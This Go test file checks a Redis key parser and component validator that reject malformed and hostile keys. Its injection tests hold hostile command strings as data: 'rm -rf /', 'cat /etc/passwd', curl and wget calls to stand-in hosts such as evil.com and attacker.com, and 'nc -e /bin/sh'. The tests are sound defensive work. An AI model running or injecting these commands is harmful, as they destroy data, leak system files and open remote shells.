package main

import (
	"testing"
)

func TestRedisKeyValidation(t *testing.T) {
	// Test valid Redis keys
	validKeys := []struct {
		key    string
		client string
		ip     string
		domain string
	}{
		{"rules:192.168.1.1|8.8.8.8|example.com", "192.168.1.1", "8.8.8.8", "example.com"},
		{"rules:10.0.0.1|2001:db8::1|test.org", "10.0.0.1", "2001:db8::1", "test.org"},
		{"rules:127.0.0.1|203.0.113.50|log:nginx-access", "127.0.0.1", "203.0.113.50", "log:nginx-access"},
	}

	for _, test := range validKeys {
		clientIP, resolvedIP, domain, err := parseRedisKey(test.key)
		if err != nil {
			t.Errorf("Valid key %s failed validation: %v", test.key, err)
			continue
		}

		if clientIP != test.client || resolvedIP != test.ip || domain != test.domain {
			t.Errorf("Key %s parsed incorrectly: got (%s, %s, %s), expected (%s, %s, %s)",
				test.key, clientIP, resolvedIP, domain, test.client, test.ip, test.domain)
		}
	}
}

func TestRedisKeyInjectionPrevention(t *testing.T) {
	// Test malicious Redis keys that should be blocked
	maliciousKeys := []string{
		"rules:192.168.1.1; rm -rf /|8.8.8.8|example.com",     // Shell injection in client IP
		"rules:192.168.1.1|8.8.8.8; cat /etc/passwd|example.com", // Shell injection in resolved IP
		"rules:192.168.1.1|8.8.8.8|example.com; curl evil.com",   // Shell injection in domain
		"rules:192.168.1.1|8.8.8.8|`curl attacker.com`",          // Command substitution
		"rules:192.168.1.1|8.8.8.8|$(wget malware.bin)",          // Command substitution
		"rules:192.168.1.1|8.8.8.8|domain&& nc -e /bin/sh",       // Command chaining
		"rules:192.168.1.1|8.8.8.8|domain||reboot",               // Command chaining
		"rules:invalid_ip|8.8.8.8|example.com",                   // Invalid IP format
		"rules:192.168.1.1|invalid_ip|example.com",               // Invalid resolved IP
		"rules:192.168.1.1|8.8.8.8|",                             // Empty domain
		"rules:192.168.1.1||example.com",                         // Empty resolved IP
		"rules:|8.8.8.8|example.com",                             // Empty client IP
		"rules:192.168.1.1|8.8.8.8",                              // Missing domain part
		"rules:192.168.1.1",                                      // Missing IP and domain parts
		"notarule:192.168.1.1|8.8.8.8|example.com",              // Wrong prefix
		"rules:192.168.1.1|8.8.8.8|example.com|extra",           // Too many parts
	}

	for _, maliciousKey := range maliciousKeys {
		_, _, _, err := parseRedisKey(maliciousKey)
		if err == nil {
			t.Errorf("Malicious key %s was not blocked by validation", maliciousKey)
		}
	}
}

func TestRedisKeyComponentValidation(t *testing.T) {
	// Test the component validation function
	validComponents := []struct {
		client string
		ip     string
		domain string
	}{
		{"192.168.1.1", "8.8.8.8", "example.com"},
		{"10.0.0.1", "2001:db8::1", "test.org"},
		{"127.0.0.1", "203.0.113.50", "log:nginx-access"}, // Allow log entries
	}

	for _, test := range validComponents {
		err := validateRedisKeyComponents(test.client, test.ip, test.domain)
		if err != nil {
			t.Errorf("Valid components (%s, %s, %s) failed validation: %v", 
				test.client, test.ip, test.domain, err)
		}
	}

	// Test malicious components
	maliciousComponents := []struct {
		client string
		ip     string
		domain string
		desc   string
	}{
		{"192.168.1.1; rm -rf /", "8.8.8.8", "example.com", "semicolon injection in client"},
		{"192.168.1.1", "8.8.8.8 && curl evil.com", "example.com", "command chaining in IP"},
		{"192.168.1.1", "8.8.8.8", "example.com`curl attacker.com`", "backtick injection in domain"},
		{"192.168.1.1", "8.8.8.8", "example.com$(wget malware)", "command substitution in domain"},
		{"", "8.8.8.8", "example.com", "empty client IP"},
		{"192.168.1.1", "", "example.com", "empty resolved IP"},
		{"192.168.1.1", "8.8.8.8", "", "empty domain"},
	}

	for _, test := range maliciousComponents {
		err := validateRedisKeyComponents(test.client, test.ip, test.domain)
		if err == nil {
			t.Errorf("Malicious components (%s, %s, %s) were not blocked (%s)", 
				test.client, test.ip, test.domain, test.desc)
		}
	}
}

func TestRedisKeyLengthValidation(t *testing.T) {
	// Test overly long components (potential buffer overflow)
	longString := make([]byte, 300)
	for i := range longString {
		longString[i] = 'a'
	}
	longDomain := string(longString) + ".com"

	err := validateRedisKeyComponents("192.168.1.1", "8.8.8.8", longDomain)
	if err == nil {
		t.Error("Overly long domain component was not blocked")
	}
}